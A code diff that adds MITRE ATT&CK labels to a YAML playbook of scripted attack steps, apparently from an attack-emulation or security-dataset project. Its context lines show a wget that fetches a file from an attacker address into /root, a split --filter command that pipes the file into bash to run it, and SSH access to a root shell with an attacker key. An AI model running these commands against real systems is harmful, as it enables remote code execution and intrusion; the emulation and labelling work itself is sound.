@@ -129,6 +129,9 @@ commands:
     read: True
     cmd: id
     session: "foothold"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     cmd: find /home -ls
@@ -147,11 +150,17 @@ commands:
   - type: msf-session
     cmd: id
     session: "foothold"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     session: "foothold"
     cmd: "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.2"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1105,T1136"
+      tactics: "Command and Control,Persistence"
 
   - type: msf-session
     cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
@@ -204,6 +213,9 @@ commands:
     username: webadmin
     key_filename: "/home/aecid/.ssh/attacker_key"
     creates_session: "rootshell"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: ssh
     cmd: pwd
